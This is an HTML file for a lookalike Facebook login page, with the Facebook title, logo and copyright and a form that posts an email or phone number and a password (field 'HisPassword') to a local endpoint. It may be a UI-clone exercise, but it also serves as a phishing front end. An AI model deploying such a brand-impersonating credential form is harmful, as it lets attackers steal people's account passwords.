<!-- Facebook Page Login -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook | Login</title>
    <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="css/fb-login.css">
</head>
<body>
    <main>
        <div class="container">
            <div class="content">
                <img class="logo" src="images/fbLogo.png">
                <form action="login" method="post">
                    <div class="login-inputs-div">
                        <input type="text" name="emailOrphoneNumber" class="input" placeholder="Mobile number or email address" required>
                        <input type="password" name="HisPassword" class="input" placeholder="Password" required>
                        <input type="submit" value="Log In">
                    </div>
                </form>
                <div class="or">
                    <hr><span id="or">Or</span><hr>
                </div>
                <div class="other-choise">
                    <a href="#" id="create-new-account">Create New Account</a>
                    <a href="#" id="Forgotten-password">Forgotten Password?</a>
                </div>
                <div class="languages">
                    <a href="#" style="color: rgb(166, 158, 158);">English (UK)</a>
                    <a href="#">Francaise (France)</a>
                    <a href="#">العربية</a>
                    <a href="#">ⵜⴰⵎⴰⵣⵉⵖⵜ</a>
                    <a href="#">Espagnol(Espana)</a>
                    <a href="#">Portuguese(Brasil)</a>
                    <a href="#">Deutsch</a>
                    <span><a href="#" id="language-plus">+</a></span>
                </div>
                <div class="footer-links">
                    <a href="#">About</a> &middot;
                    <a href="#">Help</a> &middot;
                    <a href="#">More</a>
                </div>
                <div class="footer-copyright">
                    Facebook Inc.
                </div>
            </div>
            <div class="social-icons">
                <a href="#"><i class="fa fa-github"></i> Github</a>
                <a href="https://facebook.com/iksdev"><i class="fa fa-facebook"></i> Facebook</a>
            </div>
        </div>
    </main>
</body>
</html>
